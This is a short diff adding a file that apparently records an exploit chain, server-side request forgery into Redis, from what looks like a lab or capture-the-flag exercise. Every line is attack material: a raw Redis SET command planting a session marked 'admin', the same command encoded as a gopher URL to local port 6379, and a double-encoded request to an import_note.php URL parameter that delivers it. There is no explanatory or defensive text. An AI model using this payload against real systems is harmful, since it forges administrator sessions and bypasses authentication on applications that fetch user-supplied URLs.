@@ -1,0 +1,17 @@
+# SSRF -> Redis Admin Session Injection
+Session ID: admin_from_ssrf
+Redis Key: session_admin_from_ssrf
+Session Data: {"user": "admin", "role": "admin"}
+Redis Command:
+*3
+$3
+SET
+$23
+session_admin_from_ssrf
+$34
+{"user": "admin", "role": "admin"}
+
+Gopher URL:
+gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0ASET%0D%0A%2423%0D%0Asession_admin_from_ssrf%0D%0A%2434%0D%0A%7B%22user%22%3A%20%22admin%22%2C%20%22role%22%3A%20%22admin%22%7D%0D%0A
+SSRF URL:
+http://localhost:8080/import_note.php?url=gopher%3A//127.0.0.1%3A6379/_%252A3%250D%250A%25243%250D%250ASET%250D%250A%252423%250D%250Asession_admin_from_ssrf%250D%250A%252434%250D%250A%257B%2522user%2522%253A%2520%2522admin%2522%252C%2520%2522role%2522%253A%2520%2522admin%2522%257D%250D%250A
